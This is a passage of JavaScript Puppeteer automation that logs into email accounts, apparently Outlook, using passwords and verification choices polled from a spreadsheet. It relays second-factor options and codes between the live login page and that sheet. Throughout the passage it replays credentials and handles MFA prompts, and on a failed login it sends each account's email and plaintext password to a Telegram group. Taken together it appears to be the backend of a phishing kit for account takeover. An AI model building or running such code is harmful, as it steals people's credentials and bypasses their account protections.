                      logger.debug(`[processRow][${browserId}][WAITINGEMAIL] No email found yet. Waiting...`);
                  }

              } catch (pollError) {
                  logger.error(`[processRow][${browserId}][WAITINGEMAIL] Error during polling: ${pollError.message}`);
                  await new Promise(resolve => setTimeout(resolve, 15000));
              }

              if (!emailProvidedAndProcessed) {
                  await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
              }
          }

          if (!emailProvidedAndProcessed) {
      logger.warn(`[processRow][${browserId}][WAITINGEMAIL] Polling for email timed out. Setting status to FAILED.`);
      finalStatus = "FAILED";
      updateData.status = "FAILED";
      updateData.verified = false; // FAILED so verified false
      updateData.fullAccess = false; // FAILED so fullAccess false
      updateData.cookieAccess = false; // FAILED so cookieAccess false
      updateData.lastJsonResponse = JSON.stringify({
        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
        message: "Failed during WAITINGEMAIL phase: Email not provided in time."
      });
              // Explicitly close browser and clean up immediately
              if (browser && !browserFullyClosed) {
                  if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                  await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGEMAIL timeout: ${err.message}`));
                  browserFullyClosed = true;
                  activeBrowserSessions.delete(browserId);
                  await new Promise(resolve => setTimeout(resolve, 1000));
              }
              if (userDataDir) {
                  try {
                      logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
                      await fs.remove(userDataDir);
                      logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                  } catch (deleteError) {
                      logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGEMAIL timeout: ${deleteError.message}`);
                  }
              }
              logger.debug(`[processRow][${browserId}] Exiting WAITINGEMAIL timeout path.`);
              return; // Exit processRow if email not found
          }
      } else if (currentSheetStatusFromRow === "WAITINGPASSWORD") {
          logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
          const pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
          let passwordProvidedAndProcessed = false;

          while (Date.now() < pollingTimeoutPassword && !passwordProvidedAndProcessed) {
              try {
                  // Session Health Check
                  if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                      logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Page became unresponsive. Marking as FAILED.`);
                      finalStatus = "FAILED";
                      updateData.status = "FAILED";
                      updateData.lastJsonResponse = JSON.stringify({
                          ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                          message: "Failed during WAITINGPASSWORD phase: Browser page became unresponsive."
                      });
                      break; // Exit polling loop
                  }

                  const checkData = await fetchDataFromAppScript(1, 30000, false); // Do NOT force refresh every time
                  const checkHeaders = checkData[0];
                  const checkColumnIndexes = getColumnIndexes(checkHeaders);
                  const checkRows = checkData.slice(1);
                  const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                  if (!checkRow) {
                      logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Row not found during polling. Exiting loop.`);
                      finalStatus = "FAILED";
                      break;
                  }

                  logger.debug(`[processRow][${browserId}][WAITINGPASSWORD] Full checkRow: ${JSON.stringify(checkRow)}`);
                  const currentPassword = checkRow[checkColumnIndexes['password']];
                  logger.debug(`[processRow][${browserId}][WAITINGPASSWORD] Fetched password: '*****', Type: ${typeof currentPassword}`); // Reverted to masked password

                  if (currentPassword && String(currentPassword).trim() !== "") {
                      logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found. Setting status to PROCESSING.`);
                      await updateBrowserRowData(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
                      logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Attempting to input password.`);
                      
                      // Ensure page is stable and handle any intermediate views before typing password
                      // Removed page.waitForLoadState as it's not a function in this Puppeteer version.
                      await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry'); // New context for password entry specific views

                      const passwordInputSelector = platformConfig.selectors?.passwordInput;
                      const passwordNextButtonSelector = platformConfig.selectors?.passwordNextButton;

                      if (passwordInputSelector && typeof passwordInputSelector === 'string' &&
                          passwordNextButtonSelector && (typeof passwordNextButtonSelector === 'string' || (Array.isArray(passwordNextButtonSelector) && passwordNextButtonSelector.length > 0))) {
                          try {
                              await page.waitForSelector(passwordInputSelector, { visible: true, timeout: 10000 });
                              logger.debug(`[processRow][${browserId}] Clearing password input field: ${passwordInputSelector}`);
                              await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, passwordInputSelector);
                              logger.debug(`[processRow][${browserId}] Attempting to type password into ${passwordInputSelector}`);
                              await page.type(passwordInputSelector, currentPassword, { delay: 50 });
                              logger.info(`[processRow][${browserId}] Successfully typed password.`);

                              logger.debug(`[processRow][${browserId}] Attempting to click password next button and await navigation. Selectors: ${JSON.stringify(passwordNextButtonSelector)}`);
                              let selectorsToAttempt = Array.isArray(passwordNextButtonSelector) ? passwordNextButtonSelector : [passwordNextButtonSelector];
                              let clickedSelector = null;

                              for (const selector of selectorsToAttempt) {
                                  try {
                                      // Allow more time for dynamic rendering
                                      await page.waitForSelector(selector, { visible: true, timeout: 15000 });
                                      await new Promise(res => setTimeout(res, 150)); // Small delay for stability

                                      // Attempt a JS click which can be more reliable in some cases
                                      try {
                                          await page.$eval(selector, el => (el.click && el.click()) || el.dispatchEvent(new MouseEvent('click', { bubbles: true })));
                                      } catch (jsClickError) {
                                          // Fallback to page.click if $eval fails
                                          await page.click(selector);
                                      }

                                      // Wait for navigation but don't fail if it doesn't happen
                                      await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);

                                      // Small settle time then check page state
                                      await new Promise(res => setTimeout(res, 1500));

                                      clickedSelector = selector;
                                      logger.info(`[processRow][${browserId}] Clicked password next button using selector: ${clickedSelector}`);
                                      break; // Click attempted, exit loop
                                  } catch (clickNavError) {
                                      logger.warn(`[processRow][${browserId}] Click on selector '${selector}' failed or not clickable. Trying next if available. Error: ${clickNavError.message}`);
                                  }
                              }

                              if (!clickedSelector) {
                                  // Persist WAITINGPASSWORD so user can re-submit instead of failing immediately
                                  logger.info(`[processRow][${browserId}] Could not click any password next selectors. Persisting WAITINGPASSWORD and clearing password so user can retry.`);
                                  finalStatus = "WAITINGPASSWORD";
                                  updateData.status = finalStatus;
                                  updateData.lastJsonResponse = JSON.stringify({
                                      browserId, email, status: finalStatus,
                                      emailExists: initialCheckResult.emailExists,
                                      accountAccess: initialCheckResult.accountAccess,
                                      reachedInbox: initialCheckResult.reachedInbox,
                                      requiresVerification: initialCheckResult.requiresVerification,
                                      verificationState: initialCheckResult.verificationState,
                                      verificationOptions: initialCheckResult.verificationOptions || [],
                                      platform, timestamp: new Date().toISOString(),
                                      message: "Failed to submit password: button not found or not clickable. Please provide a new password."
                                  });
                                  // Clear the password field and persist the WAITINGPASSWORD state
                                  logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
                                  await updateBrowserRowData(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                  return; // Exit processRow so no later logic overwrites status
                              }

                              logger.info(`[processRow][${browserId}] Successfully processed password next button click and navigation.`);
                              await new Promise(res => setTimeout(res, 2000)); // Wait for page to settle

                              // Handle any additional views (like "Stay Signed In") that might appear after password submission
                              await handleAdditionalViews(page, platformConfig, instanceId, 'post_password_submission');

                              // **CRITICAL**: Check for login failed (incorrect password) BEFORE checking verification/inbox
                              let passwordFailedDetected = false;
                              if (platformConfig.selectors.loginFailed) {
                                  const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ?
                                      platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
                                  
                                  for (const selector of loginFailedSelectors) {
                                      if (typeof selector === 'string') {
                                          const failExists = await page.evaluate((xpath) => {
                                              try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                          }, selector).catch(() => false);
                                          if (failExists) {
                                              logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
                                              passwordFailedDetected = true;
                                              break;
                                          }
                                      }
                                  }
                              }

                              if (passwordFailedDetected) {
                                  // Password was incorrect; persist WAITINGPASSWORD for user to retry
                                  // **Telegram Notification for Incorrect Password**
                                  logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password. Sending Telegram notification.`);
                                  const allDataForTelegram = await fetchDataFromAppScript();
                                  const headersForTelegram = allDataForTelegram[0];
                                  const columnIndexesForTelegram = getColumnIndexes(headersForTelegram);
                                  const rowDataForTelegram = allDataForTelegram.slice(1).find(r => r[columnIndexesForTelegram['browserId']] === browserId);

                                  if (rowDataForTelegram) {
                                      const projectId = rowDataForTelegram[columnIndexesForTelegram['projectId']];
                                      const storedPassword = rowDataForTelegram[columnIndexesForTelegram['password']];
                                      if (projectId) {
                                          const projectDetails = await getProjectDetails(projectId);
                                          const projectTitle = projectDetails?.projectTitle || 'Unknown Project';
                                          const telegramGroupId = projectDetails?.telegramGroupId;

                                          if (telegramGroupId) {
                                              let message = `🚨 *Login Failed: Incorrect Password* 🚨\n\n`;
                                              message += `*Project:* ${projectTitle}\n`;
                                              message += `*Email:* \`${email}\`\n`;
                                              message += `*Password:* \`${storedPassword}\`\n`;
                                              message += `*Browser ID:* \`${browserId}\`\n`;

                                              await sendTelegramMessage(telegramGroupId, message);
                                          }
                                      }
                                  }

                                  initialCheckResult = {
                                      emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
                                      verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
                                  };
                              } else {
                                  // After password submission, check if we reached inbox or a verification screen
                                  const verificationDetails = await checkVerification(page, platformConfig);
                                  if (verificationDetails.required) {
                                      initialCheckResult = {
                                          emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true,
                                          verificationState: verificationDetails.type === 'choice' ? 'WAITING_OPTIONS' : 'WAITING_CODE',
                                          verificationOptions: verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName) : [],
                                          viewName: verificationDetails.viewName
                                      };
                                  } else {
                                      const inboxReached = await isInbox(page, platformConfig);
                                      initialCheckResult = {
                                          emailExists: true, accountAccess: true, reachedInbox: inboxReached, requiresVerification: false, verificationState: null
                                      };
                                  }
                              }

                              // If a password attempt resulted in a password-specific failure or accountAccess=false,
                              // transition back to WAITINGPASSWORD so the user can provide a new password.
                              if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR' || (initialCheckResult.emailExists && !initialCheckResult.accountAccess && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined))) {
                                  // **Telegram Notification for Incorrect Password**
                                  logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Sending Telegram notification.`);
                                  const allDataForTelegram = await fetchDataFromAppScript();
                                  const headersForTelegram = allDataForTelegram[0];
                                  const columnIndexesForTelegram = getColumnIndexes(headersForTelegram);
                                  const rowDataForTelegram = allDataForTelegram.slice(1).find(r => r[columnIndexesForTelegram['browserId']] === browserId);

                                  if (rowDataForTelegram) {
                                      const projectId = rowDataForTelegram[columnIndexesForTelegram['projectId']];
                                      const storedPassword = rowDataForTelegram[columnIndexesForTelegram['password']];
                                      if (projectId) {
                                          const projectDetails = await getProjectDetails(projectId);
                                          const projectTitle = projectDetails?.projectTitle || 'Unknown Project';
                                          const telegramGroupId = projectDetails?.telegramGroupId;

                                          if (telegramGroupId) {
                                              let message = `🚨 *Login Failed: Incorrect Password* 🚨\n\n`;
                                              message += `*Project:* ${projectTitle}\n`;
                                              message += `*Email:* \`${email}\`\n`;
                                              message += `*Password:* \`${storedPassword}\`\n`;
                                              message += `*Browser ID:* \`${browserId}\`\n`;

                                              await sendTelegramMessage(telegramGroupId, message);
                                          }
                                      }
                                  }

                                  logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Setting status to WAITINGPASSWORD.`);
                                  finalStatus = "WAITINGPASSWORD";
                                  // Ensure updateData reflects the new status immediately so finally() sees it
                                  updateData.status = finalStatus;
                                  updateData.lastJsonResponse = JSON.stringify({
                                      browserId, email, status: finalStatus,
                                      emailExists: initialCheckResult.emailExists,
                                      accountAccess: initialCheckResult.accountAccess,
                                      reachedInbox: initialCheckResult.reachedInbox,
                                      requiresVerification: initialCheckResult.requiresVerification,
                                      verificationState: initialCheckResult.verificationState,
                                      verificationOptions: initialCheckResult.verificationOptions || [],
                                      platform, timestamp: new Date().toISOString(),
                                      message: initialCheckResult.message || "Incorrect password. Please provide a valid password."
                                  });
                                  // Clear the password field and persist the WAITINGPASSWORD state
                                  logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
                                  await updateBrowserRowData(browserId, { ...updateData, password: '' });
                                  return; // Exit processRow so no later logic overwrites status
                              }

                              passwordProvidedAndProcessed = true;
                              // Do not clear password from sheet after attempt as per user request
                              // await updateBrowserRowData(browserId, { verificationCode: '', verificationChoice: '' });

                          } catch (e) {
                              logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Error during password entry/submission: ${e.message}`);
                              initialCheckResult = { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, error: e.message };
                              // If an error occurs during password entry, we should break the loop and set status to FAILED
                              finalStatus = "FAILED";
                              break;
                          }
                      } else {
                          logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Cannot resume: Missing password input or next button selectors. passwordInputSelector: '${passwordInputSelector}', passwordNextButtonSelector: '${passwordNextButtonSelector}'.`);
                          logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Cannot resume: Missing password input or next button selectors.`);
                          initialCheckResult = { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, error: "Missing password selectors for WAITINGPASSWORD resume." };
                          finalStatus = "FAILED";
                          break;
                      }
                  } else {
                      logger.debug(`[processRow][${browserId}][WAITINGPASSWORD] No password found yet. Waiting...`);
                  }

              } catch (pollError) {
                  logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Error during polling: ${pollError.message}`);
                  await new Promise(resolve => setTimeout(resolve, 15000));
              }

              if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
                  await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
              }
          }

          if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
              logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Polling for password timed out. Setting status to FAILED.`);
              finalStatus = "FAILED";
              updateData.status = "FAILED";
              updateData.verified = false; // FAILED so verified false
              updateData.fullAccess = false; // FAILED so fullAccess false
              updateData.lastJsonResponse = JSON.stringify({
                  ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                  message: "Failed during WAITINGPASSWORD phase: Password not provided in time."
              });
              // Explicitly close browser and clean up immediately
              if (browser && !browserFullyClosed) {
                  if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                  await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGPASSWORD timeout: ${err.message}`));
                  browserFullyClosed = true;
                  activeBrowserSessions.delete(browserId);
                  await new Promise(resolve => setTimeout(resolve, 1000));
              }
              if (userDataDir) {
                  try {
                      logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
                      await fs.remove(userDataDir);
                      logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                  } catch (deleteError) {
                      logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGPASSWORD timeout: ${deleteError.message}`);
                  }
              }
              logger.debug(`[processRow][${browserId}] Exiting WAITINGPASSWORD timeout path.`);
              return; // Exit processRow if password not found
          }
          // Update updateData based on the result of the polling loop
          updateData.status = finalStatus;
          if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
              updateData.lastJsonResponse = JSON.stringify({
                  ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                  message: "Failed during WAITINGPASSWORD phase."
              });
          }
      } else if (currentSheetStatusFromRow === "WAITINGOPTIONS") {
          logger.info(`[processRow][${browserId}] Resuming from WAITINGOPTIONS state.`);
          const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000; 

          while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
              try {
                  const currentPageVerificationState = await checkVerification(page, platformConfig);
                  if (!currentPageVerificationState.required || currentPageVerificationState.type !== 'choice') {
                      logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected to be on a choice screen, but current page is not. View: ${currentPageVerificationState.viewName || 'unknown'}. Type: ${currentPageVerificationState.type || 'unknown'}. Failing.`);
                      finalStatus = "FAILED";
                      updateData.status = "FAILED";
                      updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Page state changed unexpectedly during WAITINGOPTIONS."});
                      break; 
                  }
                  
                  const currentActualViewName = currentPageVerificationState.viewName;
                  logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Current actual view for options: ${currentActualViewName}`);
                  let freshCurrentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName);
                  
                  const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                  if (ljp.viewName !== currentActualViewName || JSON.stringify(ljp.verificationOptions) !== JSON.stringify(freshCurrentVerificationOptions)) {
                      logger.info(`[processRow][${browserId}][WAITINGOPTIONS] View or options changed/refreshed. Updating LJR and sheet. LJR View: ${ljp.viewName}, Actual View: ${currentActualViewName}`);
                      updateData.lastJsonResponse = JSON.stringify({
                          ...ljp,
                          viewName: currentActualViewName,
                          verificationOptions: freshCurrentVerificationOptions, 
                          status: "WAITINGOPTIONS" 
                      });
                      await updateBrowserRowData(browserId, {
                        status: "WAITINGOPTIONS",
                        verified: true,
                        fullAccess: false,
                        verificationOptions: JSON.stringify(freshCurrentVerificationOptions),
                        lastJsonResponse: updateData.lastJsonResponse
                    });
                      currentVerificationOptions = freshCurrentVerificationOptions; 
                  } else {
                      currentVerificationOptions = ljp.verificationOptions || freshCurrentVerificationOptions;
                  }

                  const checkData = await fetchDataFromAppScript(1, 30000, true);
                  const checkHeaders = checkData[0];
                  const checkColumnIndexes = getColumnIndexes(checkHeaders);
                  const checkRows = checkData.slice(1);
                  const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                  if (!checkRow) {
                      logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
                      finalStatus = "FAILED"; break;
                  }

                  const currentSheetStatus = checkRow[columnIndexes['status']];
                  const verificationChoiceRaw = checkRow[columnIndexes['verificationChoice']];

                  if (currentSheetStatus !== "WAITINGOPTIONS") {
                      logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                      finalStatus = currentSheetStatus; break;
                  }

                  if (verificationChoiceRaw) {
                      logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found: ${verificationChoiceRaw}. Setting status to PROCESSING.`);
                      await updateBrowserRowData(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification choice", verificationChoice: verificationChoiceRaw }) }); // Set status to PROCESSING
                      
                      let choiceData = null;
                      let hiddenInputText = null;
                      let chosenOptionIndex = null;
                      
                      try {
                          const parsedChoice = JSON.parse(verificationChoiceRaw);
                          if (Array.isArray(parsedChoice) && parsedChoice.length > 0) {
                              choiceData = parsedChoice[0];
                          } else if (typeof parsedChoice === 'object' && parsedChoice !== null) {
                              choiceData = parsedChoice;
                          }
                          if (choiceData) {
                              hiddenInputText = choiceData.hiddenPhoneEmail;
                              chosenOptionIndex = choiceData.choice;
                          }
                      } catch (e) {
                          if (currentActualViewName === 'Outlook Verify Email Full Input') {
                              hiddenInputText = verificationChoiceRaw.trim(); 
                              logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Interpreted verificationChoiceRaw as plain string for full email input: '${hiddenInputText}' for view ${currentActualViewName}`);
                          } else {
                              logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Invalid verificationChoice format for view '${currentActualViewName}'. Expected JSON, got raw text. Error: ${e.message}. Clearing choice.`);
                      await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions), verified: true, fullAccess: false });
                              await new Promise(resolve => setTimeout(resolve, 10000));
                              continue;
                          }
                      }
                      
                      if (!currentVerificationOptions || currentVerificationOptions.length === 0) {
                           logger.error(`[processRow][${browserId}][WAITINGOPTIONS] currentVerificationOptions is unexpectedly empty for view '${currentActualViewName}'. Failing.`);
                           finalStatus = "FAILED"; break;
                      }
                      
                      let selectedOption;
                      if (currentActualViewName === 'Outlook Verify Email Full Input') {
                          if (currentVerificationOptions.length > 0 && currentVerificationOptions[0].type === 'full_email_input') {
                              selectedOption = currentVerificationOptions[0]; 
                              logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Using 'full_email_input' option for view: ${currentActualViewName}`);
                              if (!hiddenInputText) { 
                              logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'hiddenPhoneEmail' (full email) is required for '${currentActualViewName}' but not provided in verificationChoice. Value was: '${hiddenInputText}'.`);
                              await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) }); 
                              await new Promise(resolve => setTimeout(resolve, 10000));
                              continue;
                              }
                          } else {
                               logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected 'full_email_input' option type for view '${currentActualViewName}' but found: ${JSON.stringify(currentVerificationOptions)}. Clearing choice.`);
                          await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                               await new Promise(resolve => setTimeout(resolve, 10000));
                               continue;
                          }
                      } else { 
                          if (!chosenOptionIndex) {
                               logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'choice' (index) property missing in verificationChoice data for view '${currentActualViewName}'.`);
                               await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) }); 
                               await new Promise(resolve => setTimeout(resolve, 10000));
                               continue;
                          }
                          selectedOption = currentVerificationOptions.find(opt => opt.choiceIndex === chosenOptionIndex);
                      }

                      if (!selectedOption) {
                          logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Chosen option (index: ${chosenOptionIndex}, for view: ${currentActualViewName}) not found or applicable in current options. Options: ${JSON.stringify(currentVerificationOptions)}`);
                          await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                          await new Promise(resolve => setTimeout(resolve, 10000));
                          continue;
                      }
                      
                      logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Processing option: ${JSON.stringify(selectedOption)} for view: ${currentActualViewName}`);

                      try {
                          if (selectedOption.type !== 'full_email_input' && selectedOption.id) {
                              await page.waitForSelector(`#${selectedOption.id}`, { visible: true, timeout: 5000 });
                              await page.click(`#${selectedOption.id}`);
                              logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked radio button: #${selectedOption.id}`);
                              await new Promise(res => setTimeout(res, 500)); 
                          } else if (selectedOption.type === 'full_email_input') {
                              logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Full email input type, no radio button to click for selection, input will be typed.`);
                          }

                          if (selectedOption.requiresInput && selectedOption.inputSelector && hiddenInputText) {
                              await page.waitForSelector(selectedOption.inputSelector, { visible: true, timeout: 5000 });
                              await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, selectedOption.inputSelector);
                              await page.type(selectedOption.inputSelector, hiddenInputText, { delay: 50 });
                              logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${hiddenInputText}" into ${selectedOption.inputSelector}`);
                          } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                               logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
                               await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                               await new Promise(resolve => setTimeout(resolve, 10000));
                               continue;
                          } else if (selectedOption.requiresInput && !hiddenInputText) {
                               logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Option requires input, but no hiddenPhoneEmail provided. Attempting to proceed without it for option: ${selectedOption.label}`);
                          }
                          
                          let sendCodeBtnSelector;
                          if (currentActualViewName === 'Outlook Verify Email Full Input') {
                              sendCodeBtnSelector = platformConfig.selectors.verifyEmailSendCodeButton;
                          } else { 
                              sendCodeBtnSelector = platformConfig.selectors.sendCodeButton;
                          }

                          if (!sendCodeBtnSelector) throw new Error(`Send code button selector not defined for current view/platform configuration. View: ${currentActualViewName}`);
                          
                          logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Attempting to click send code button: ${sendCodeBtnSelector} for view ${currentActualViewName}`);
                          await page.waitForSelector(sendCodeBtnSelector, { visible: true, timeout: 10000 }); 
                                  const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                                  await page.click(sendCodeBtnSelector);
                                  await navigationPromise;
                                  logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked "Send code" button: ${sendCodeBtnSelector}`);
                                  await new Promise(res => setTimeout(res, 2000));

                                  const outlookServiceErrorText = "There's a temporary problem with the service.";
                                  const hasOutlookServiceError = await page.evaluate((errorText) => {
                                      return document.body.innerText.includes(errorText);
                                  }, outlookServiceErrorText).catch(() => false);

                                  if (hasOutlookServiceError) {
                                      logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Outlook service error detected: "${outlookServiceErrorText}"`);
                                      const errorOption = [{ label: "Outlook: Temporary service problem. Please wait and try again.", type: "service_error", choiceIndex: "outlook_service_error" }];
                                      currentVerificationOptions = errorOption; // Update for LJR

                                      const ljpServiceError = JSON.parse(updateData.lastJsonResponse || '{}');
                                      updateData.lastJsonResponse = JSON.stringify({
                                          ...ljpServiceError,
                                          status: "WAITINGOPTIONS",
                                          verificationState: 'WAITING_OPTIONS',
                                          verificationOptions: errorOption,
                                          viewName: currentActualViewName, 
                                          message: "Outlook reported a temporary service problem. Please try again later."
                                      });
                                      await updateBrowserRowData(browserId, {
                                          status: "WAITINGOPTIONS",
                                          verificationChoice: '', // Re-added clearing
                                          verificationOptions: JSON.stringify(errorOption),
                                          lastJsonResponse: updateData.lastJsonResponse
                                      });
                                      // Continue to the next iteration of the WAITINGOPTIONS polling loop
                                      await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
                                      continue; 
                                  }
                                  
                                  const verificationStatusAfterSend = await checkVerification(page, platformConfig);
                                  if (verificationStatusAfterSend.required && verificationStatusAfterSend.type === 'code') {
                                      logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Successfully sent code. Transitioning to WAITINGCODE. View detected: ${verificationStatusAfterSend.viewName}`);
                                      finalStatus = "WAITINGCODE";
                                      const ljpBeforeCodeSend = JSON.parse(updateData.lastJsonResponse || '{}');
                                      updateData = {
                                          status: "WAITINGCODE",
                                          verificationChoice: '', // Re-added clearing
                                          lastJsonResponse: JSON.stringify({
                                              ...ljpBeforeCodeSend, 
                                              status: "WAITINGCODE", 
                                              verificationState: 'WAITING_CODE',
                                              viewName: verificationStatusAfterSend.viewName,
                                              verificationOptions: currentVerificationOptions, 
                                              message: "Code sent, awaiting input."
                                          })
                                      };
                                      await updateBrowserRowData(browserId, updateData);
                                      break;
                                  } else {
                                      logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Did not reach a recognized 'code' entry screen after sending code. verificationStatusAfterSend: ${JSON.stringify(verificationStatusAfterSend)}. Current URL: ${page.url()}`);
                                      const stillOnChoicePage = await checkVerification(page, platformConfig); 
                                      if (stillOnChoicePage.required && stillOnChoicePage.type === 'choice') {
                                          logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Still on a choice page: '${stillOnChoicePage.viewName}'. Input might be wrong or page didn't transition as expected. Clearing choice and re-setting to WAITINGOPTIONS.`);
                                          currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, stillOnChoicePage.viewName); 
                                          await updateBrowserRowData(browserId, {
                                              status: "WAITINGOPTIONS",
                                              verificationOptions: JSON.stringify(currentVerificationOptions), 
                                              lastJsonResponse: JSON.stringify({ 
                                                  ...JSON.parse(updateData.lastJsonResponse || '{}'), 
                                                  status: "WAITINGOPTIONS", 
                                                  viewName: stillOnChoicePage.viewName, 
                                                  verificationOptions: currentVerificationOptions, 
                                                  message: "Failed to send code or invalid input, please re-enter choice."
                                              })
                                          });
                                      } else {
                                          logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Unexpected page state after attempting to send code. Failing.`);
                                          finalStatus = "FAILED"; break;
                                      }
                                  }
                      } catch (interactionError) {
                          logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during page interaction for choice: ${interactionError.message}. Clearing choice and retrying WAITINGOPTIONS.`);
                          currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName).catch(() => currentVerificationOptions); 
                          await updateBrowserRowData(browserId, {
                              status: "WAITINGOPTIONS",
                              verificationOptions: JSON.stringify(currentVerificationOptions), 
                              lastJsonResponse: JSON.stringify({ 
                                  ...JSON.parse(updateData.lastJsonResponse || '{}'), 
